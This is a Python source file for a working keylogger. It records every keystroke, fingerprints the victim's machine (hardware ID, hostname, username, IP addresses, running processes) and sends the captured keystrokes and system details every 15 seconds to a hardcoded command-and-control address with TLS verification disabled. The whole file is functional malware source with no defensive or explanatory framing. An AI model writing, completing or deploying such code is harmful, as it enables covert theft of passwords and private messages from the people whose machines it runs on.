from pynput import keyboard
import requests
import threading
import time
import platform
import subprocess
import hashlib
import os
import socket

C2_URL = "https://10.5.41.160:8443/log"

# --- Gather stable victim identity ---
HOSTNAME = platform.node()

def get_hwid():
    """Return a hardware ID unique per machine, cross-platform."""
    try:
        system = platform.system()
        if system == "Linux":
            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
                if os.path.exists(path):
                    with open(path) as f:
                        raw = f.read().strip()
                        return hashlib.sha256(raw.encode()).hexdigest()[:16]
            return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

        elif system == "Windows":
            try:
                raw = subprocess.check_output(
                    ["powershell", "-Command",
                     "Get-CimInstance Win32_DiskDrive | Select-Object -First 1 -ExpandProperty SerialNumber"],
                    text=True, timeout=5
                ).strip()
            except Exception:
                raw = subprocess.check_output(
                    ["powershell", "-Command",
                     "(Get-Volume -DriveLetter C).SerialNumber"],
                    text=True, timeout=5
                ).strip()
            if raw:
                return hashlib.sha256(raw.encode()).hexdigest()[:16]

        return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

    except Exception:
        return hashlib.sha256(HOSTNAME.encode()).hexdigest()[:16]

HWID = get_hwid()

# --- Gather extra system info for first transfer ---
def gather_system_info():
    info = {}
    info["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
    info["architecture"] = platform.machine()
    info["username"] = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    info["local_ip"] = socket.gethostbyname(socket.gethostname())

    # Try to get public IP (can fail silently)
    try:
        info["public_ip"] = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        info["public_ip"] = "unknown"

    # Process list (truncated)
    try:
        if platform.system() == "Windows":
            output = subprocess.check_output(
                ["powershell", "-Command",
                 "Get-Process | Select-Object -First 20 -ExpandProperty ProcessName"],
                text=True, timeout=5
            )
        else:
            output = subprocess.check_output(
                ["ps", "--no-headers", "-eo", "comm"],
                text=True, timeout=5
            )[:500]
        info["processes"] = output.strip()
    except Exception:
        info["processes"] = "unknown"

    return info

SYSTEM_INFO = gather_system_info()

buffer = []
lock = threading.Lock()
first_beacon = True  # flag to send system info on first trip

def beacon():
    global buffer, first_beacon
    while True:
        time.sleep(15)
        with lock:
            if not buffer and not first_beacon:
                continue
            data = "".join(buffer)
            buffer = []
            send_info = first_beacon
            first_beacon = False

        payload = {"k": data, "hostname": HOSTNAME, "hwid": HWID}

        if send_info:
            # Embed full system info in the first POST
            payload["first_contact"] = "1"
            payload["os"] = SYSTEM_INFO["os"]
            payload["arch"] = SYSTEM_INFO["architecture"]
            payload["username"] = SYSTEM_INFO["username"]
            payload["local_ip"] = SYSTEM_INFO["local_ip"]
            payload["public_ip"] = SYSTEM_INFO["public_ip"]
            payload["processes"] = SYSTEM_INFO["processes"]

        try:
            requests.post(C2_URL, data=payload, verify=False, timeout=5)
        except Exception:
            pass

def on_press(key):
    with lock:
        try:
            buffer.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                buffer.append(" ")
            else:
                key_str = str(key).replace("Key.", "")
                buffer.append(f" [{key_str}] ")

t = threading.Thread(target=beacon, daemon=True)
t.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()